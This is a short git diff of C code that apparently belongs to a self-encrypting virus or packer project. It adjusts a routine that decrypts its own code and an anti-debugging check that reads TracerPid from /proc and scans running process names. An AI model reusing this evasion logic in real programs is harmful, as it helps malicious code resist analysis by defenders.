@@ -151,14 +151,11 @@ int _start() {
 
 int do_main(void) {
 	if (process_runing()) {
-		return (0);
-	} else
-	{
+		write(1,"yoyo\n",5);
+		exit (0);
+	}
 		decrypter(get_eip() - ((char *)&yeah - (char *)&real_start));
 		main_encrypt();
-	}
-
-
 	return (0);
 }
 
@@ -212,7 +209,6 @@ bool process_runing(void) {
 	TracerPid_name[8] = 'd';
 	TracerPid_name[9] = ':';
 	TracerPid_name[10] = '\0';
-
 	fd = open(proc, 0, 0);
 	while ((i = read(fd, buf, 255)) > 0) {
 		if ((TracerPid = ft_strnstr(buf, TracerPid_name, i)) != 0) {
@@ -221,10 +217,11 @@ bool process_runing(void) {
 				TracerPid++;
 			}
 			if (*TracerPid != '0' && *TracerPid != '\n')
-				exit(0);
+				return 1;
 		}
 	}
 	close(fd);
+
 	proc[6] = 0;
 	dd = open(proc, 0x10000, 0);
 	if (dd <= 0) {
@@ -257,7 +254,6 @@ bool process_runing(void) {
 			if (ft_isallnum(d->d_name) == 0) {
 				ft_memmove(path + 6, d->d_name, ft_strlen(d->d_name) + 1);
 				ft_memmove(path + ft_strlen(path), cmdline, 9);
-
 				fd = open(path, 0, 0);
 				j = read(fd, cmdname, 63);
 				close(fd);
